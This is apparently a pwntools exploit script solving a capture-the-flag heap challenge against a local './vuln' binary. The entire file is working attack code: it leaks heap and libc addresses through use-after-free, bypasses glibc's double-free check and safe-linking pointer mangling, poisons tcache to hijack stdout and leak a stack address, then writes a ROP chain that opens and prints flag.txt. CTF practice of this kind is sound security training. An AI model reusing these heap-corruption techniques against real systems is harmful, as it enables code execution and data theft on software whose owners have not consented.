from pwn import *

#p = process("./vuln", env = {"LD_PRELOAD":"/root/pwn/ctf/imaginaryctf/libc.so.6"})
exe = ELF("./vuln")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.binary = exe

p = process([exe.path])
a = p.recv()

def deobfuscate(val):
    mask = 0xfff << 52
    while mask:      
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val


def alloc_flag(idx, size, val):
    p.sendline(b'1')
    p.recv()

    p.sendline(str(idx).encode())
    p.recv()

    p.sendline(str(size).encode())
    p.recv()

    p.sendline(val)
    ret = p.recv()

    print("alloc index: " + str(idx))
    print("flag: ", ret)

def alloc_leak(idx, size, val):
    p.sendline(b'1')
    p.recv()

    p.sendline(str(idx).encode())
    p.recv()

    p.sendline(str(size).encode())
    p.recv()

    p.sendline(val)
    ret = u64(p.recv(8)[:-1].ljust(8, b'\x00'))

    print("alloc index: " + str(idx))
    print("stack leak: " + str(hex(ret)))

    return ret

def alloc(idx, size, val):
    p.sendline(b'1')
    p.recv()
    
    p.sendline(str(idx).encode())
    p.recv()
    
    p.sendline(str(size).encode())
    p.recv()

    p.sendline(val)
    ret = p.recv()

    #print("alloc index: " + str(idx))
    #print("received: " + str(ret))

def free(idx):
    p.sendline(b'2')
    p.recv()

    p.sendline(str(idx).encode())

    #print("free index : " + str(idx))

def read(idx):
    p.sendline(b'3')
    p.recv()

    p.sendline(str(idx).encode())
    a = p.recv()

    #print("read index: " + str(idx) + " value: " + str(a.hex())) 
    #print("test: " + hex(int(a[5::-1].hex(), 16)))

    return int(a[5::-1].hex(), 16)

#Clean out bins
for i in range(16):
    alloc(i, 24, b"CCCC")
for i in range(16):
    alloc(i, 104, b"CCCC")
for i in range(9):
    alloc(i, 120, b"CCCC")
for i in range(5):
    alloc(i, 200, b"CCCC")
for i in range(2):
    alloc(i, 232, b"CCCC")


#Allocate chunks to fill up the 0x210 size tcache bin
for i in range(7):
    alloc(i, 512, b"AAAAAAAA")

#Allocate victim and adjacent chunks
alloc(7, 512, b"ADJACENT")
alloc(8, 512, b"VICTIM")

#Allocate barrier chunk
alloc(9, 16, b"flag.txt\x00")

#Fill up dat tcache bin
for i in range(7):
    free(i)

#Leak and deobfuscate heap pointer
heap_addr = read(5)
heap_leak = deobfuscate(heap_addr)
print("heap leak: " + str(hex(heap_leak)))
heap_base = (heap_leak >> 12 << 12)-0x2000
print("heap base: " + str(hex(heap_base)))


#Bypass double free protection
free(8)
free(7)
alloc(1, 512, b"BEEP")

#Leak libc addr with read-after-free
libc_leak = read(8)
libc.address = libc_leak - (0x7fabd3019ce0 - 0x7fabd2e00000)

#Get environ pointer to use as write target
environ = libc.symbols['environ']
print("environ addr: " + str(hex(environ)))

#Get stdout pointer
stdout = libc.symbols['_IO_2_1_stdout_']
print("stdout addr: " + str(hex(stdout)))

#Double Free on Victim Chunk
free(8)
#p.interactive()

#Grab the consolidated chunk from unsorted bin
#Attempt to overwrite header data of tcache double freed chunk
ow_string = b"A"*0x208 + p64(0x211)
ow_string = ow_string + (p64((stdout^ ((heap_base + 0x3320) >> 12))))
print("ow_string: " + str(ow_string))

alloc(1, 0x400, ow_string)
#p.interactive()

#Allocate another chunk of 0x200 size to remove corrupted chunk from tcache
alloc(2, 512, b"AAAA")

#Allocate another 0x200 sized chunk and write our payload
ow_string = p64(0xfbad1800) + p64(environ)*4 + p64(environ+0x8)*4
stack_leak = alloc_leak(3, 512, ow_string)

free(1)
free(2)

#was stack_leak - 168 ... 
payload = b"D"*0x208 + p64(0x211)
payload = payload + (p64(((stack_leak-0x188) ^ ((heap_base + 0x3320) >> 12))))
alloc(1, 0x400, payload)

print("overwrite stack pointer: " + str(hex(( (stack_leak-0x188) ^ ((heap_base + 0x3320) >> 12) ))))

alloc(2, 0x200, b"XXXXXXXX")

rop = ROP(libc)
flag = heap_base + 0x35a0
output = flag+0x20
#syscall = libc.address + 0x29db4
print("flag address: ", hex(flag))

rop.call('syscall', [2, flag, 0, 0])
rop.call('syscall', [0, 3, output, 0x100])
rop.call('syscall', [1, 1, output, 0x100])
rop.call('syscall', [0, 1, output, 0x100])

alloc_flag(3, 0x200, b"CCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFAAAAAAAA" + rop.chain())
p.interactive()
